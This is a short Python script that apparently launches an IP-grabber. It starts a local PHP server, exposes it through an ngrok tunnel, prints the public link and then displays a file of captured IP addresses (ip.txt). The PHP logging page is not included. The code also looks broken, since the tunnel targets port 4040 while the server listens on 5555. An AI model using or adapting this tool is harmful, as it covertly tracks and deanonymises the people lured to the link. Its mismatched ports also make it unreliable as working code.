import os
from colorama import Fore
import pyfiglet
from pyngrok import ngrok
from subprocess import Popen
#Mr_ngrok |mobin-Dan
print(Fore.GREEN)
os.system("clear")
ins =pyfiglet.figlet_format("Ip;)", font="3-d")
print(Fore.RED+ins)
with open("server","w") as phplog:
    Popen(("php","-S","localhost:5555"),stderr=phplog ,stdout=phplog)
link=ngrok.connect(4040,"http")
print(link)
print(Fore.CYAN)
input("")
os.system("cat ip.txt")
